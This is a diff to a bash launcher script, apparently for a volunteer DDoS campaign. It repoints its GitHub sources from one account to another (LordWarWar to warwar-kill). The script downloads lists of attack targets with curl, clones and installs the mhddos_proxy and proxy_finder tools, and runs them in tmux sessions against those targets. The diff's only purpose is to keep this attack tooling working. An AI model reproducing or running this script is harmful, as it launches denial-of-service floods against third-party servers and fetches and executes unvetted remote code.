@@ -37,7 +37,7 @@ rm -rf ~/multidd/targets/*
 #echo "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/all.txt)" > ~/multidd/targets/source1.txt
 
 # 1 Альтернативний пул на базі цілей Кібер-Козаків
-echo "$(curl -s https://raw.githubusercontent.com/LordWarWar/transmit/main/targets/all.txt)" > ~/multidd/targets/source1.txt
+echo "$(curl -s https://raw.githubusercontent.com/warwar-kill/transmit/main/targets/all.txt)" > ~/multidd/targets/source1.txt
 
 # 2 IT ARMY of Ukraine                             https://t.me/itarmyofukraine2022
 echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.packet.payload.data.path | select (. != null)')" > ~/multidd/targets/source2.txt
@@ -102,7 +102,7 @@ if [[ $db1000n == "on" ]]; then
 fi
 
 if [[ $proxy_finder == "on" ]]; then
-    tmux split-window -v -p 20 'rm -rf ~/multidd/proxy_finder; git clone https://github.com/LordWarWar/proxy_finder ~/multidd/proxy_finder; cd ~/multidd/proxy_finder; python3.8 -m pip install -r requirements.txt; clear; echo -e "\x1b[32mШукаю проксі, в середньому одна робоча знаходиться після 10млн перевірок\x1b[m"; python3.8 ~/multidd/proxy_finder/finder.py  --threads $proxy_threads'
+    tmux split-window -v -p 20 'rm -rf ~/multidd/proxy_finder; git clone https://github.com/warwar-kill/proxy_finder ~/multidd/proxy_finder; cd ~/multidd/proxy_finder; python3.8 -m pip install -r requirements.txt; clear; echo -e "\x1b[32mШукаю проксі, в середньому одна робоча знаходиться після 10млн перевірок\x1b[m"; python3.8 ~/multidd/proxy_finder/finder.py  --threads $proxy_threads'
 fi
 tmux attach-session -t multidd
 }
@@ -133,7 +133,7 @@ cat > auto_bash.sh << 'EOF'
 while true; do
     #install mhddos_proxy
     cd ~/multidd/
-    git clone https://github.com/LordWarWar/mhddos_proxy.git
+    git clone https://github.com/warwar-kill/mhddos_proxy.git
     cd ~/multidd/mhddos_proxy
     python3 -m pip install -r requirements.txt
 
